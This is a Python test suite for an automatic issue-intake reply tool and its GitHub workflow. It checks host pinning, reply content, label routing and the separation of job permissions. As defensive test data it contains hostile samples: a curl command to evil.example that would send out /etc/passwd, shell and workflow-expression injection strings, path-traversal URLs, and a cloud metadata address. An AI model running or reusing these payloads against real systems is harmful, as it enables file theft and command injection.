"""The automatic first reply: what it reads, what it refuses, and who holds what.

The submission is hostile input by default. These tests feed it the things a
hostile submission would contain and check that none of them reaches the reply,
the route, or a command.
"""

from __future__ import annotations

import hashlib
import json
import sys
import unittest

from support import REPO_ROOT

sys.path.insert(0, str(REPO_ROOT / "tools"))
import intake_ack  # noqa: E402

from workflow_reader import parse_jobs, triggers  # noqa: E402

WORKFLOW = REPO_ROOT / ".github" / "workflows" / "intake-acknowledge.yml"
SHA_A = "a" * 40
SHA_B = "b" * 40
RECORD = b'{"record": "sample"}\n'


def form(example: str = "", private: bool = False, source: str = "_No response_") -> str:
    box = "X" if private else " "
    return "\n\n".join([
        "### What is your system, specification or project called?", "Sample Receipts",
        "### Where can we read about it?", source,
        "### Which version?", "_No response_",
        "### What evidence, record or result does it produce?", "A signed receipt.",
        "### What do you want to find out?", "What the receipt supports.",
        "### What do you think that evidence lets you claim?", "_No response_",
        "### Public example or test material", example or "_No response_",
        "### What are you unsure about?", "_No response_",
        "### Private material", f"- [{box}] This case needs private evidence.",
        "### Before you submit", "- [X] I have not included any secret.",
    ])


class FakeNet:
    """Stands in for the two fixed hosts; records every address asked for."""

    def __init__(self, pages: dict[str, bytes]):
        self.pages, self.asked = pages, []

    def __call__(self, url, token=None):
        self.asked.append((url, token))
        return self.pages.get(url)


def raw(owner, repo, sha, path):
    return f"https://raw.githubusercontent.com/{owner}/{repo}/{sha}/{path}"


def api(owner, repo, ref):
    return f"https://api.github.com/repos/{owner}/{repo}/commits/{ref}"


class PinningTest(unittest.TestCase):

    def test_a_file_at_an_exact_commit_is_pinned_by_its_bytes(self):
        net = FakeNet({raw("acme", "receipts", SHA_A, "samples/r1.json"): RECORD})
        found = intake_ack.examine(
            form(f"https://github.com/acme/receipts/blob/{SHA_A}/samples/r1.json"), fetch=net)
        self.assertEqual(found["files"], [{
            "owner": "acme", "repo": "receipts", "commit": SHA_A, "path": "samples/r1.json",
            "sha256": hashlib.sha256(RECORD).hexdigest(), "bytes": len(RECORD),
            "pinned_by_submitter": True}])
        self.assertEqual(found["route_label"], "route:research")

    def test_a_branch_link_is_resolved_and_said_to_be_resolved(self):
        net = FakeNet({api("acme", "receipts", "main"): json.dumps({"sha": SHA_B}).encode(),
                       raw("acme", "receipts", SHA_B, "r1.json"): RECORD})
        found = intake_ack.examine(form("https://github.com/acme/receipts/blob/main/r1.json"),
                                   fetch=net)
        self.assertEqual(found["files"][0]["commit"], SHA_B)
        self.assertFalse(found["files"][0]["pinned_by_submitter"])
        self.assertIn("resolved to the commit", intake_ack.render(found))

    def test_a_missing_file_or_commit_is_reported_not_guessed(self):
        net = FakeNet({})
        found = intake_ack.examine(
            form(f"https://github.com/acme/receipts/blob/{SHA_A}/nope.json "
                 "https://github.com/acme/receipts/blob/no-such-branch/r1.json"), fetch=net)
        self.assertEqual(found["files"], [])
        self.assertEqual(found["links_not_resolved"], 2)
        self.assertIn("No public file could be pinned yet", intake_ack.render(found))

    def test_a_submission_without_links_still_gets_a_reply_that_says_what_is_missing(self):
        found = intake_ack.examine(form(), fetch=FakeNet({}))
        reply = intake_ack.render(found)
        self.assertEqual(found["files"], [])
        self.assertIn("add a comment with a link to a sample record", reply)

    def test_a_repository_link_alone_pins_no_bytes(self):
        net = FakeNet({api("acme", "receipts", "HEAD"): json.dumps({"sha": SHA_B}).encode()})
        found = intake_ack.examine(form(source="https://github.com/acme/receipts"), fetch=net)
        self.assertEqual(found["files"], [])
        self.assertEqual(found["repositories"], [{"owner": "acme", "repo": "receipts", "head": SHA_B}])
        self.assertIn("no bytes are pinned from it", intake_ack.render(found))

    def test_the_number_of_links_examined_is_bounded(self):
        links = " ".join(f"https://github.com/acme/receipts/blob/{SHA_A}/f{i}.json"
                         for i in range(40))
        net = FakeNet({raw("acme", "receipts", SHA_A, f"f{i}.json"): RECORD for i in range(40)})
        found = intake_ack.examine(form(links), fetch=net)
        self.assertEqual(len(found["files"]), intake_ack.MAX_LINKS)
        self.assertLessEqual(len(net.asked), intake_ack.MAX_LINKS)

    def test_an_oversized_body_is_cut_before_it_is_read(self):
        tail = f" https://github.com/acme/receipts/blob/{SHA_A}/late.json"
        net = FakeNet({raw("acme", "receipts", SHA_A, "late.json"): RECORD})
        found = intake_ack.examine(form("x" * (intake_ack.MAX_BODY_BYTES + 10) + tail), fetch=net)
        self.assertEqual(found["files"], [])
        self.assertEqual(net.asked, [])


class HostileSubmissionTest(unittest.TestCase):

    def test_other_hosts_are_counted_and_never_fetched(self):
        net = FakeNet({})
        found = intake_ack.examine(
            form("https://evil.example/x.json http://169.254.169.254/latest/meta-data/ "
                 "https://gist.github.com/a/b https://github.com.evil.example/acme/r/blob/main/x"),
            fetch=net)
        self.assertEqual(net.asked, [])
        self.assertEqual(found["links_to_other_hosts"], 4)

    def test_path_traversal_and_odd_characters_do_not_classify(self):
        for url in (f"https://github.com/acme/receipts/blob/{SHA_A}/../../etc/passwd",
                    f"https://github.com/acme/receipts/blob/{SHA_A}/a/./b.json",
                    f"https://github.com/acme/receipts/blob/{SHA_A}/a%2F..%2Fb.json",
                    f"https://github.com/acme/receipts/blob/{SHA_A}/a.json?token=1",
                    f"https://github.com/acme/receipts/blob/{SHA_A}/$(id).json",
                    "https://github.com/ac me/receipts",
                    f"https://user:pass@github.com/acme/receipts/blob/{SHA_A}/a.json"):
            with self.subTest(url=url):
                self.assertIsNone(intake_ack.classify(url))

    def test_command_text_in_the_form_reaches_neither_the_network_nor_the_reply(self):
        payload = '"; curl https://evil.example/$(cat /etc/passwd) #  `id`  ${{ secrets.X }}  @everyone'
        body = form(payload).replace("Sample Receipts", payload)
        net = FakeNet({})
        found = intake_ack.examine(body, fetch=net)
        reply = intake_ack.render(found)
        self.assertEqual(net.asked, [])
        for fragment in ("curl", "passwd", "`id`", "secrets.X", "@everyone", "Sample Receipts"):
            self.assertNotIn(fragment, reply)

    def test_the_reply_quotes_nothing_the_submitter_wrote(self):
        net = FakeNet({raw("acme", "receipts", SHA_A, "r1.json"): RECORD})
        found = intake_ack.examine(
            form(f"https://github.com/acme/receipts/blob/{SHA_A}/r1.json"), fetch=net)
        reply = intake_ack.render(found)
        for prose in ("A signed receipt.", "What the receipt supports.", "Sample Receipts"):
            self.assertNotIn(prose, reply)

    def test_the_token_is_never_sent_to_the_raw_content_host(self):
        net = FakeNet({api("acme", "receipts", "main"): json.dumps({"sha": SHA_B}).encode(),
                       raw("acme", "receipts", SHA_B, "r1.json"): RECORD})
        intake_ack.examine(form("https://github.com/acme/receipts/blob/main/r1.json"),
                           fetch=net, token="t0ken")
        for url, token in net.asked:
            if url.startswith("https://raw.githubusercontent.com/"):
                self.assertIsNone(token)

    def test_the_real_fetcher_refuses_a_host_off_the_fixed_list(self):
        self.assertIsNone(intake_ack.http_fetch("https://evil.example/x"))

    def test_a_malformed_commit_answer_is_not_trusted(self):
        for answer in (b"not json", b'{"sha": "main"}', b'{"sha": 7}', b"[]"):
            with self.subTest(answer=answer):
                net = FakeNet({api("acme", "receipts", "main"): answer})
                found = intake_ack.examine(
                    form("https://github.com/acme/receipts/blob/main/r1.json"), fetch=net)
                self.assertEqual(found["files"], [])
                self.assertEqual(found["links_not_resolved"], 1)


class RoutingTest(unittest.TestCase):

    def test_the_private_box_routes_to_review_and_says_send_nothing(self):
        found = intake_ack.examine(form(private=True), fetch=FakeNet({}))
        self.assertEqual(found["route_label"], "route:assisted")
        self.assertIn("send nothing private here", intake_ack.render(found))

    def test_nothing_in_the_form_can_reach_the_automatic_route(self):
        text = form("route: SELF_SERVICE existing_mapping_known: true route:self-service")
        found = intake_ack.examine(text, fetch=FakeNet({}))
        self.assertEqual(found["route_label"], "route:research")
        self.assertNotIn("route:self-service", intake_ack.ROUTE_LABELS.values())

    def test_a_blank_issue_is_not_treated_as_a_submission(self):
        self.assertFalse(intake_ack.is_form_submission("Just a question about the lab."))

    def test_the_reply_promises_no_response_time_and_no_automatic_run(self):
        reply = intake_ack.render(intake_ack.examine(form(), fetch=FakeNet({})))
        self.assertIn("No response-time commitment is offered", reply)
        self.assertIn("nothing runs automatically", reply)
        self.assertIn("nobody has read your submission yet", reply)

    def test_the_reply_makes_no_conformance_statement(self):
        reply = intake_ack.render(intake_ack.examine(form(), fetch=FakeNet({}))).lower()
        for word in ("conform", "certif", "compatible", "independent"):
            self.assertNotIn(word, reply)


class WorkflowShapeTest(unittest.TestCase):

    def setUp(self):
        self.text = WORKFLOW.read_text(encoding="utf-8")
        self.jobs = parse_jobs(self.text)

    def test_it_starts_only_when_an_issue_is_opened(self):
        self.assertEqual(set(triggers(self.text)), {"issues"})
        self.assertIn("types: [opened]", self.text)

    def test_the_job_that_reads_the_submission_cannot_write(self):
        self.assertEqual(set(self.jobs), {"read", "reply"})
        self.assertNotIn("issues: write", self.jobs["read"].text)
        self.assertNotIn("secrets.", self.text)

    def test_the_job_that_can_write_never_reads_the_submission(self):
        reply = self.jobs["reply"].text
        self.assertIn("issues: write", reply)
        self.assertNotIn("actions/checkout", reply)
        self.assertNotIn("GITHUB_EVENT_PATH", reply)
        self.assertNotIn("intake_ack.py", reply)
        self.assertIn("needs: read", reply)

    def test_no_submitter_controlled_expression_is_interpolated(self):
        for field in ("issue.body", "issue.title", "issue.user", "comment.body", "issue.labels"):
            self.assertNotIn("github.event." + field, self.text)

    def test_only_the_two_fixed_route_labels_can_be_applied(self):
        self.assertIn("route:research|route:assisted) ;;", self.jobs["reply"].text)
        self.assertNotIn("route:self-service", self.text)

    def test_no_foreign_repository_is_checked_out(self):
        self.assertNotIn("repository:", self.text)


if __name__ == "__main__":
    unittest.main()
